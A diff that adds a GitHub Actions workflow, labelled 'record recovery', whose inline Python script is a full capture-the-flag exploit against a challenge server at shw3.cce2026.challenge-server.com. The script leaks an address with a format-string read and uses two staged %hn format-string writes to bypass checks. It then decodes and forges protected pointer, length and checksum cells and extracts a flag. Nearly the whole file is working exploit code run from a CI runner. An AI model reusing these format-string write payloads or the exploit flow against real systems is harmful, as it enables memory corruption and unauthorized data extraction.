@@ -1,0 +1,202 @@
+name: CCE 2026 record recovery (temporary)
+
+on:
+  push:
+    paths:
+      - .github/workflows/cce2026-record-recover.yml
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+jobs:
+  recover:
+    runs-on: ubuntu-latest
+    timeout-minutes: 5
+    steps:
+      - name: Recover protected record
+        shell: bash
+        run: |
+          python3 - <<'PY'
+          #!/usr/bin/env python3
+          import re
+          import socket
+          import sys
+          import time
+
+          HOST = sys.argv[1] if len(sys.argv) > 1 else "shw3.cce2026.challenge-server.com"
+          PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 42126
+
+          M64 = (1 << 64) - 1
+          M32 = (1 << 32) - 1
+          C0 = 0x6A09E667F3BCC909
+          C1 = 0xBF58476D1CE4E5B9
+          C2 = 0x94D049BB133111EB
+          G = 0x9E3779B97F4A7C15
+          KRP = 0x510E527FADE682D1
+          KRL = 0x1F83D9ABFB41BD6B
+          KDP = 0x9B05688C2B3E6C1F
+          KDL = 0x5BE0CD19137E2179
+          KINT = 0xCBBB9D5DC1059ED8
+
+          def rol(x: int, n: int, bits: int = 64) -> int:
+              mask = (1 << bits) - 1
+              x &= mask
+              return ((x << n) | (x >> (bits - n))) & mask
+
+          def ror(x: int, n: int, bits: int = 64) -> int:
+              return rol(x, bits - n, bits)
+
+          def rol32(x: int, n: int) -> int:
+              return rol(x, n, 32)
+
+          def mix(x: int) -> int:
+              x &= M64
+              x ^= x >> 30
+              x = (x * C1) & M64
+              x ^= x >> 27
+              x = (x * C2) & M64
+              x ^= x >> 31
+              return x & M64
+
+          def positions(layout: int) -> tuple[int, int]:
+              i = layout & 7
+              j = (i + ((layout >> 3) % 7) + 1) & 7
+              return 3 + i, 3 + j
+
+          def fmt_write32(value: int, layout: int) -> bytes:
+              lo = value & 0xFFFF
+              hi = (value >> 16) & 0xFFFF
+              pos_lo, pos_hi = positions(layout)
+              parts = [f"%2${lo or 65536}c%{pos_lo}$hn"]
+              delta = (hi - lo) & 0xFFFF
+              if delta:
+                  parts.append(f"%2${delta}c")
+              parts.append(f"%{pos_hi}$hn")
+              return "".join(parts).encode()
+
+          class Tube:
+              def __init__(self, host: str, port: int):
+                  self.sock = socket.create_connection((host, port), timeout=15)
+                  self.sock.settimeout(15)
+                  self.buf = b""
+
+              def send(self, data: bytes) -> None:
+                  self.sock.sendall(data)
+
+              def recv_until(self, pattern: bytes, timeout: float = 20.0) -> bytes:
+                  rx = re.compile(pattern, re.DOTALL)
+                  deadline = time.monotonic() + timeout
+                  while True:
+                      match = rx.search(self.buf)
+                      if match:
+                          out = self.buf[:match.end()]
+                          self.buf = self.buf[match.end():]
+                          return out
+                      if time.monotonic() > deadline:
+                          raise TimeoutError(f"timeout waiting for {pattern!r}; buffered={self.buf[-1000:]!r}")
+                      try:
+                          chunk = self.sock.recv(65536)
+                      except socket.timeout:
+                          continue
+                      if not chunk:
+                          raise EOFError(f"connection closed while waiting for {pattern!r}; buffered={self.buf!r}")
+                      self.buf += chunk
+
+              def recv_exact(self, n: int) -> bytes:
+                  while len(self.buf) < n:
+                      chunk = self.sock.recv(65536)
+                      if not chunk:
+                          raise EOFError(f"connection closed with {n-len(self.buf)} bytes missing")
+                      self.buf += chunk
+                  out, self.buf = self.buf[:n], self.buf[n:]
+                  return out
+
+              def close(self) -> None:
+                  self.sock.close()
+
+          def parse_hex_match(pattern: bytes, blob: bytes) -> tuple[int, ...]:
+              match = re.search(pattern, blob)
+              if not match:
+                  raise RuntimeError(f"parse failed: {pattern!r} in {blob[-2000:]!r}")
+              return tuple(int(group, 16) for group in match.groups())
+
+          def main() -> None:
+              tube = Tube(HOST, PORT)
+              try:
+                  banner = tube.recv_until(rb"STATE OBSERVE\n")
+                  print("[+] connected:", banner.decode("latin1", errors="replace").strip())
+
+                  tube.send(b"OBSERVE 4\n%1$p\n")
+                  out = tube.recv_until(rb"CAL A MASK [0-9a-fA-F]{8} LAYOUT [0-9a-fA-F]{8}\n")
+                  diag_addr, am, al = parse_hex_match(
+                      rb"(0x[0-9a-fA-F]+)\nCAL A MASK ([0-9a-fA-F]{8}) LAYOUT ([0-9a-fA-F]{8})", out
+                  )
+                  print(f"[+] diag={diag_addr:#x} am={am:08x} al={al:08x}")
+
+                  target_a = (rol32((diag_addr & M32) ^ am, 9) + al) & M32
+                  payload = fmt_write32(target_a, al)
+                  tube.send(f"ADJUST {len(payload)}\n".encode() + payload + b"\n")
+                  tube.recv_until(rb"STAGED A\n")
+                  tube.send(b"MEASURE\n")
+                  out = tube.recv_until(rb"CAL B MASK [0-9a-fA-F]{8} LAYOUT [0-9a-fA-F]{8}\n")
+                  bm, bl = parse_hex_match(
+                      rb"CAL B MASK ([0-9a-fA-F]{8}) LAYOUT ([0-9a-fA-F]{8})", out
+                  )
+                  print(f"[+] stage A accepted; bm={bm:08x} bl={bl:08x}")
+
+                  x = rol32((diag_addr & M32) ^ am, 9)
+                  x = (x + bm + al) & M32
+                  x = rol32(x, 13)
+                  target_b = x ^ (((diag_addr + 0x1000) & M32) ^ bl)
+                  payload = fmt_write32(target_b, bl)
+                  tube.send(f"ADJUST {len(payload)}\n".encode() + payload + b"\n")
+                  tube.recv_until(rb"STAGED B\n")
+                  tube.send(b"MEASURE\n")
+                  tube.recv_until(rb"ARCHIVE READY\n")
+                  print("[+] stage B accepted; archive unlocked")
+
+                  cells = {}
+                  for index in (-6, -5):
+                      tube.send(f"CATALOG {index}\n".encode())
+                      out = tube.recv_until(rb"CELL -?\d+ [0-9a-fA-F]{16}\n")
+                      match = re.search(rb"CELL (-?\d+) ([0-9a-fA-F]{16})", out)
+                      if not match:
+                          raise RuntimeError(f"catalog parse failed: {out!r}")
+                      cells[int(match.group(1))] = int(match.group(2), 16)
+
+                  master = mix(rol(((al << 32) | bl), 17) ^ diag_addr ^ ((am << 32) | bm) ^ C0)
+                  inv_g = pow(G, -1, 1 << 64)
+                  real_ptr = (((ror(cells[-6], 23) * inv_g) & M64) ^ mix(KRP ^ master)) & M64
+                  real_len = (cells[-5] ^ mix(KRL ^ master)) & M64
+                  if not (1 <= real_len <= 4096):
+                      raise RuntimeError(f"decoded record length is implausible: {real_len}")
+
+                  sealed_ptr = rol((((real_ptr ^ mix(KDP ^ master)) * G) & M64), 23)
+                  sealed_len = real_len ^ mix(KDL ^ master)
+                  checksum = mix(master ^ real_ptr ^ rol(real_len, 17) ^ KINT)
+                  print(f"[+] protected record decoded: ptr={real_ptr:#x} len={real_len}")
+
+                  for index, value in ((-2, sealed_ptr), (-1, sealed_len), (0, checksum)):
+                      tube.send(f"REVISE {index} {value:016x}\n".encode())
+                      tube.recv_until(rb"UPDATED -?\d+\n")
+
+                  tube.send(b"RELEASE\n")
+                  header = tube.recv_until(rb"DATA \d+\n")
+                  match = re.search(rb"DATA (\d+)\n$", header)
+                  if not match:
+                      raise RuntimeError(f"bad DATA header: {header!r}")
+                  size = int(match.group(1))
+                  record = tube.recv_exact(size)
+                  print("[+] recovered record:")
+                  print(record.decode("utf-8", errors="replace"))
+                  flag = re.search(rb"(?:ccd|cce)2026\{[^}\r\n]+\}", record)
+                  if not flag:
+                      raise RuntimeError(f"flag not found in recovered record: {record!r}")
+                  print("FLAG=" + flag.group(0).decode())
+              finally:
+                  tube.close()
+
+          if __name__ == "__main__":
+              main()
+          PY
